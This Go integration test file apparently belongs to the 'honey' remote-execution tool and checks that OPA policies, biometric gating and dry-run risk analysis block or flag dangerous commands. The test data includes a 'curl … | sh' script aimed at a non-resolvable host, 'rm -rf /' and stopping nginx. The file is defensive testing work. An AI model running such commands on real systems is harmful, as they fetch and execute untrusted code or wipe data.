//go:build integration

package integration

import (
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/shareed2k/honey/internal/apps"
	"github.com/shareed2k/honey/internal/config"
	"github.com/shareed2k/honey/internal/hosts"
	"github.com/shareed2k/honey/internal/webauthn"
	"github.com/shareed2k/honey/internal/webserver"
)

// hasSkippedRisk reports whether any result was skipped with a risk reason.
func hasSkippedRisk(results []map[string]any, needle string) bool {
	for _, r := range results {
		skipped, _ := r["Skipped"].(bool)
		out, _ := r["Output"].(string)
		if skipped && strings.Contains(out, needle) {
			return true
		}
	}
	return false
}

// --- command-risk OPA contextual deny (high severity on prod via host_vars) ---

func TestOPAE2E_CueExec_CommandRiskOPADeny(t *testing.T) {
	target := newSSHTarget(t)
	client := &http.Client{Timeout: 30 * time.Second}
	enf := newEnforcer(t, `package honey
import rego.v1
default allow := true
default deny_reason := ""
allow := false if {
	input.action == "command_exec"
	input.command.max_severity == "high"
	input.target.host_vars.tier == "prod"
}
deny_reason := "high-risk command on prod host" if {
	input.action == "command_exec"
	input.command.max_severity == "high"
	input.target.host_vars.tier == "prod"
}`)

	out := "/tmp/opa_cmdrisk_opa.txt"
	recipePath := writeCmdRecipeCustom(t, "opa-cmdrisk-opa", "systemctl stop nginx >/dev/null 2>&1 || true; echo ran > "+out)
	configPath := filepath.Join(t.TempDir(), "honey.yaml")
	require.NoError(t, os.WriteFile(configPath, []byte(""), 0o600))

	base := newTestServer(t, webserver.Options{
		Token:          "test-token",
		Enforcer:       enf,
		ConfigPath:     configPath,
		SearchRegistry: target.searchReg,
		ExecRegistry:   target.execReg,
		Config: &config.File{
			Apps:     map[string]apps.AppConfig{"opa_app": {Type: apps.AppTypeRecipe, TargetRecipe: recipePath, Target: "ssh-test"}},
			Defaults: config.Defaults{SSHUser: "testuser"},
			Inventory: config.Inventory{Hosts: map[string]config.InventoryHost{
				"ssh-test": {Vars: map[string]config.InventoryValue{"tier": config.MustInventoryValue("prod")}},
			}},
		},
	})

	resp := postCueExec(t, client, base, recipePath, []hosts.Record{target.rec}, nil, map[string]string{"Authorization": authHeader()})
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode)
	require.True(t, hasSkippedRisk(decodeResults(t, resp), "high-risk command on prod"), "command must be OPA-denied on prod host")
	if _, err := target.readFile(t, out); err == nil {
		t.Fatal("denied command must not run")
	}
}

// --- command-risk on a script step (OPA-gated) ----------------------------

// TestOPAE2E_ScriptRiskCritical proves the risk gate analyzes a script step's
// CONTENTS (not just an inline command string) and hands the resulting severity
// to OPA, which is now the only thing that can deny it: honey has no built-in
// critical floor any more, so the deny has to come from the policy.
//
// The script body is a critical-classified `curl | sh` pointing at a
// non-resolvable host: harmless if it ever did run, which keeps this test from
// being destructive when the gate is the thing under test.
func TestOPAE2E_ScriptRiskCritical(t *testing.T) {
	target := newSSHTarget(t)
	client := &http.Client{Timeout: 30 * time.Second}

	enf := newEnforcer(t, `package honey
import rego.v1
default allow := true
default deny_reason := ""
allow := false if {
	input.action == "command_exec"
	input.command.max_severity == "critical"
}
deny_reason := "critical command risk denied by policy" if {
	input.action == "command_exec"
	input.command.max_severity == "critical"
}`)

	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, "danger.sh"),
		[]byte("#!/bin/sh\ncurl https://nonexistent.invalid/x | sh\n"), 0o600))
	recipePath := filepath.Join(dir, "script.cue")
	cue := `
recipe: {
	name: "opa-script-risk"
	steps: [
		{ host: "*", script: { local: "danger.sh", remote: "/tmp/danger.sh" } },
	]
}
`
	require.NoError(t, os.WriteFile(recipePath, []byte(cue), 0o600))
	configPath := filepath.Join(dir, "honey.yaml")
	require.NoError(t, os.WriteFile(configPath, []byte(""), 0o600))

	base := newTestServer(t, webserver.Options{
		Token:          "test-token",
		Enforcer:       enf,
		ConfigPath:     configPath,
		SearchRegistry: target.searchReg,
		ExecRegistry:   target.execReg,
		Config: &config.File{
			Apps:     map[string]apps.AppConfig{"opa_app": {Type: apps.AppTypeRecipe, TargetRecipe: recipePath, Target: "ssh-test"}},
			Defaults: config.Defaults{SSHUser: "testuser"},
		},
	})

	resp := postCueExec(t, client, base, recipePath, []hosts.Record{target.rec}, nil, map[string]string{"Authorization": authHeader()})
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode)
	require.True(t, hasSkippedRisk(decodeResults(t, resp), "critical command risk denied by policy"),
		"a critical script must be denied by the OPA policy")
}

// --- require_biometric denied without a token -----------------------------

func TestOPAE2E_RequireBiometric_Denied(t *testing.T) {
	target := newSSHTarget(t)
	client := &http.Client{Timeout: 30 * time.Second}
	enf := newEnforcer(t, `package honey
import rego.v1
default allow := false
default deny_reason := ""
default decision := ""
allow if input.action == "api_request"
allow if input.action == "step_execute"
allow if input.action == "command_exec"
allow if { input.action == "recipe_execute"; input.execution.biometricVerified == true }
decision := "require_biometric" if { input.action == "recipe_execute"; not input.execution.biometricVerified }
deny_reason := "biometric required" if { input.action == "recipe_execute"; not input.execution.biometricVerified }`)

	out := "/tmp/opa_biom.txt"
	recipePath := writeCmdRecipe(t, "opa-biom", out)
	// No WebAuthn manager + no token → require_biometric hard-denies.
	base := cueExecServer(t, target, recipePath, webserver.Options{Token: "test-token", Enforcer: enf})

	resp := postCueExec(t, client, base, recipePath, []hosts.Record{target.rec}, []string{"MARK=x"}, map[string]string{"Authorization": authHeader()})
	defer resp.Body.Close()
	require.Equal(t, http.StatusBadRequest, resp.StatusCode)
	if _, err := target.readFile(t, out); err == nil {
		t.Fatal("biometric-gated run must not execute without a token")
	}
}

// --- dry-run risk assessment ----------------------------------------------

func TestOPAE2E_DryRunRiskAssessment(t *testing.T) {
	target := newSSHTarget(t)
	client := &http.Client{Timeout: 30 * time.Second}
	recipePath := writeCmdRecipeCustom(t, "opa-dryrisk", "rm -rf /")
	base := cueExecServer(t, target, recipePath, webserver.Options{Token: "test-token"})

	body := webserver.CueExecRequest{RecipePath: recipePath, Execute: false, SSHUser: "testuser", Records: []hosts.Record{target.rec}}
	resp := doJSONHeaders(t, client, http.MethodPost, base+"/api/v1/cue-exec", body, map[string]string{"Authorization": authHeader()})
	defer resp.Body.Close()
	require.Equal(t, http.StatusOK, resp.StatusCode)

	var out struct {
		Plan           string `json:"plan"`
		RiskAssessment []struct {
			Command  string `json:"command"`
			Analysis struct {
				Critical    bool   `json:"critical"`
				MaxSeverity string `json:"max_severity"`
			} `json:"analysis"`
		} `json:"risk_assessment"`
	}
	require.NoError(t, json.NewDecoder(resp.Body).Decode(&out))
	require.NotEmpty(t, out.RiskAssessment)
	require.True(t, out.RiskAssessment[0].Analysis.Critical, "dry-run must flag rm -rf / as critical: %+v", out.RiskAssessment)
}

// --- WebAuthn endpoints (reachable paths without an authenticator) ---------

func TestOPAE2E_WebAuthn_Endpoints(t *testing.T) {
	target := newSSHTarget(t)
	client := &http.Client{Timeout: 15 * time.Second}
	mgr, err := webauthn.New("localhost", "https://localhost", []byte("test-secret-32-bytes-padding!!"), 5*time.Minute)
	require.NoError(t, err)

	configPath := filepath.Join(t.TempDir(), "honey.yaml")
	require.NoError(t, os.WriteFile(configPath, []byte(""), 0o600))
	base := newTestServer(t, webserver.Options{
		DisableAuth:    true,
		WebAuthn:       mgr,
		ConfigPath:     configPath,
		SearchRegistry: target.searchReg,
		ExecRegistry:   target.execReg,
		Config:         &config.File{Defaults: config.Defaults{SSHUser: "testuser"}},
	})

	// register/begin returns credential-creation options.
	respReg := doJSONHeaders(t, client, http.MethodPost, base+"/api/v1/webauthn/register/begin", nil, nil)
	defer respReg.Body.Close()
	require.Equal(t, http.StatusOK, respReg.StatusCode)

	// assert/begin with no registered passkey errors.
	respAssert := doJSONHeaders(t, client, http.MethodPost, base+"/api/v1/webauthn/assert/begin", nil, nil)
	defer respAssert.Body.Close()
	require.Equal(t, http.StatusBadRequest, respAssert.StatusCode)
}
